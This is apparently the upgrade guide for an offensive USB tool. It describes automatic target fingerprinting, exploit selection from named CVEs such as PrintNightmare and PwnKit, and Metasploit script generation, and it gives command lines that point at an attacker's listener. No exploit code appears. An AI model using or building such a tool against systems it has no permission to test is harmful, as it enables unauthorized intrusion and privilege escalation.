# ZERO_SPLOIT_USB v3.0 Upgrade Guide

## 🚀 What's New in v3.0?

The v3.0 upgrade transforms ZERO_SPLOIT_USB from a payload builder into an **Automated Exploitation Framework**.

### 1. **Zero-Touch Automation (`--auto`)**
The tool now features a "Self-Automated" mode. Once executed on a target system (via USB or other means), it automatically:
- Fingerprints the OS, architecture, and user privileges.
- Matches the system against a database of high-reliability exploits.
- Generates a tailored Metasploit resource script for immediate deployment.

### 2. **Advanced Exploit Database**
Integrated a curated list of exploits with **85%+ success rates**, including:
- **Windows**: Follina (CVE-2022-30190), PrintNightmare, SMBGhost.
- **Linux**: Dirty Pipe (CVE-2022-0847), PwnKit (CVE-2021-4034).
- **Android**: Automated ADB injection and permission escalation.

### 3. **Modular Architecture**
- `core/fingerprint.py`: Robust system detection logic.
- `core/exploit_manager.py`: Logic for selecting the most effective exploit for the environment.
- `usbninja_v3.py`: The new main entry point for automated operations.

## 🛠️ How to Use

### Automated Mode
To run the tool in its most advanced, self-automated state:
```bash
python3 usbninja_v3.py --auto --lhost <YOUR_IP> --lport <YOUR_PORT>
```

### Manual Integration
You can still use the classic features or manually select platforms:
```bash
python3 usbninja_v3.py --lhost <YOUR_IP>
```

## 📁 Project Structure (Upgraded)
```
ZERO_SPLOIT_USB-main/
├── core/
│   ├── fingerprint.py      # New: Auto-detection engine
│   └── exploit_manager.py  # New: Exploit selection logic
├── deploy_v3/              # New: Automated deployment output
├── usbninja_v3.py          # New: Main automated framework
├── usbninja_enhanced.py    # Classic: Manual builder
└── ... (existing files)
```

## ⚠️ Legal Disclaimer
This tool is for authorized penetration testing and educational purposes only. Unauthorized use is strictly prohibited.
